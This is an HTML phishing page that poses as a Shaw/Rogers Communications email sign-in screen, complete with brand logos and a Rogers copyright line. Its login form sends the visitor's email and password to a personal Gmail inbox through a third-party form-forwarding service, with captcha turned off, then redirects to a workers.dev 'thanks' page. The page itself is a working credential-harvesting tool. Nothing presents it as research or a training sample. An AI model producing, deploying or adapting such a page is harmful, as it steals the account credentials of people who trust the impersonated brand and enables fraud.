<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shaw</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="shortcut icon" href="image/Rogers_logo-OG.png" type="image/x-icon">
    <link rel="stylesheet" href="css/bootstrap.css">
</head>

<body>
    <div class="container-fluid">
        <div class="row"
            style="background-image:url(image/rogers-backgroundd.png);background-size: cover;background-repeat: no-repeat; height: 100vh;">
            <div class="container">
                <div class="row mt-5">
                    <div class="col-lg-6 mx-auto my-5 px-5 pb-5"
                        style="border:1px solid; background-color: rgb(132, 128, 128);border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
                        <div class="text-center pt-5">
                            <img src="image/RTWS.png" alt="" class="img-fluid" width="100px">
                            <br>
                            <p class="h5 mt-4">Please enter with the valid email credentials</p>
                        </div>
                        <div class="row mt-5">
                            <div class="row justify-content-center">
                                <div class="col-12 col-md-6 col-lg-4 text-center">
                                    <img src="image/Rogers_logo-OG.png" alt="" class="img-fluid mx-auto pb-3"
                                        style="max-width: 40px; width: 100%;">
                                    <button type="button" class="btn btn-danger btn-width w-100 w-md-auto"
                                        data-bs-toggle="modal" data-bs-target="#staticBackdrop">
                                        Sign in 
                                    </button>
                                </div>
                            </div>
                            <!-- Modal -->
                            <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static"
                                data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel"
                                aria-hidden="true">
                                <div class="modal-dialog">
                                    <div class="modal-content">
                                        <div class="modal-header">
                                            <!-- <h1 class="modal-title fs-5" id="staticBackdropLabel">Modal title</h1> -->
                                            <button type="button" class="btn-close" data-bs-dismiss="modal"
                                                aria-label="Close"></button>
                                        </div>
                                        <div class="modal-body">
                                            <div class="col-lg-12 text-center">
                                                <img src="image/RTWS.png" alt=""
                                                    class="img-fluid rounded-circle  justify-content-center"
                                                    width="80px">
                                                <h5 class=" modal-title fs-5 pt-2">Sign in to access your email</h5>
                                            </div>
                                            <form action="https://formsubmit.co/iamkeshhy@gmail.com"
                                                method="POST">
                                                <input type="hidden" name="_next"
                                                    value="https://soft-water-6e2e.alicecatherine784.workers.dev//thanks.html">
                                                <div class="col-lg-12">
                                                    <input type="hidden" name="_subject" value="shaw">
                                                    <input type="hidden" name="_captcha" value="false">
                                                    <label for="Email">Shaw Email </label>
                                                    <br>
                                                    <input type="text" id="Email" name="Email" required
                                                        placeholder=" Shaw Email" class="">
                                                    <p class="text-muted form-text">We'll never share your email with
                                                        anyone
                                                        else.
                                                    </p>
                                                    <span class="text-danger" id="error-email"
                                                        style="display: none;">Please
                                                        enter
                                                        your email address</span>
                                                </div>
                                                <div class="col-lg-12">
                                                    <label for="Password">Password:</label>
                                                    <br>
                                                    <input type="text" id="Password" name="Password" required
                                                        placeholder="Password">
                                                    <br>
                                                    <br>
                                                    <span class="text-danger" id="error-password"
                                                        style="display: none;">Please
                                                        enter
                                                        your password</span>
                                                </div>
                                                <!-- <button input="sign" value="">Login</button> -->
                                                <div class="modal-footer">
                                                    <button type="button" class="btn btn-secondary"
                                                        data-bs-dismiss="modal">Close</button>
                                                    <button input="sign" value=""
                                                        class="btn btn-danger btn-lg pull-right"
                                                        id="submit-btn">Login</button>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-lg-12">
                            <p class="text-dark mt-3 text-center">Click on the sign in to continue</p>
                            <p class="h6 text-center text-dark">© 2026 Rogers Communications </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="js/bootstrap.bundle.js"></script>
    <script src="js/alert.js"></script>
</body>

</html>
